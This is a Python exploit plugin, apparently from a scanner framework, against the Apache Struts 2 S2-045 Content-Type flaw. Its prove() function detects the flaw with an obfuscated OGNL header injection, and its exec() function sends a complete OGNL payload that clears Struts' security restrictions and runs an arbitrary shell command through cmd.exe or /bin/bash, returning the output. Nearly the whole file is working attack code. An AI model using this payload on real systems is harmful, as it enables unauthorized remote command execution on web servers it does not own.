#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'



def get_script_info(data=None):
    script_info = {
        "name": "Struts 2-045",
        "info": "This is a test.",
        "level": "low",
        "type": "info",
        "author": "orleven",
        "url": "",
        "keyword": "tag:iis",
        "source": 1
    }
    return script_info

def prove(data):
    '''
    data = {
        "target_host":"",
        "target_port":"",
        "proxy":"",
        "dic_one":"",
        "dic_two":"",
        "cookie":"",
        "url":"",
        "flag":"",
        "data":"",
        "":"",

    }

    '''

    import socket
    socket.setdefaulttimeout(5)
    headers = {}
    if 'cookie' in data.keys():
        headers["Cookie"] = data['cookie']
    headers[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    headers[
        "Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
    import requests
    requests.packages.urllib3.disable_warnings()
    try:
        res = requests.get(data['url'], headers=headers,verify=False)
        if res.headers['header_str2045'] == 'header_str2045_multipart':
            data['flag'] = True
            data['data'].append({"headers": headers})
            data['res'].append({"info": res.headers,"key":"header_str2045"})
    except:
        pass
    return data


def exec(data=None):
    import socket
    socket.setdefaulttimeout(5)
    headers = {}
    cmd = data['cmd'] if 'cmd' in data.keys() else  'whoami'
    if 'cookie' in data.keys() != "":
        headers["Cookie"] = data['cookie']
    headers[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    headers[
        "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    try:
        import requests
        content = requests.get(data['url'], headers=headers, verify=False).content
        data['flag'] = True
        data['data'].append({"headers": headers})
        data['res'].append({"info": content,"key":cmd})
    except:
        pass
    return data
